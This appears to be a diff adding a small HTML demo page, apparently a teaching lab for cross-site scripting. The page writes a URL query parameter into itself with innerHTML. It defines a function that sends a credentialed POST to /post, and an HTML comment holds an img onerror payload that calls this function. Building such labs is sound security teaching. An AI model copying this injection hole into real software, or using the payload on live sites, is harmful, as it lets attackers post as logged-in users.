@@ -1,0 +1,38 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Secure Cookie Example</title>
+  </head>
+  <body>
+    <h1>
+      Unauthorized acccesss:Welcome to the world of security, Mr:
+      <span id="userName"></span>
+    </h1>
+
+    <script>
+      // Get 'name' from query string
+      const params = new URLSearchParams(window.location.search);
+      const name = params.get("name");
+
+      if (name) {
+        document.getElementById("userName").innerHTML = name;
+      }
+    </script>
+    <script>
+      function createPost(title, description) {
+        var xhr = new XMLHttpRequest();
+        xhr.open("POST", "/post", true);
+        xhr.withCredentials = true;
+        xhr.setRequestHeader(
+          "Content-Type",
+          "application/x-wwww-form-urlencode"
+        );
+        xhr.send(`txtName=${title}&mtxMesssgae=${description}`);
+      }
+    </script>
+    <!-- name=<img src="error.gif" onerror="createPost("HackTitle",
+    "HackDescription")"> -->
+  </body>
+</html>
